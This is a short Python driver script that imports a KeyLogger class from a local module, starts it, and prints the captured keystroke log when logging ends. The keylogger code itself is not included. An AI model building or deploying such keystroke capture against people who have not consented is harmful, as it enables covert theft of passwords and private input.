from keyLogger import KeyLogger


if __name__ == '__main__':
    myLogger = KeyLogger()
    myLogger.start()
    myLogger.onFinalized(lambda log: print('LOGGER RESULT :' + log))

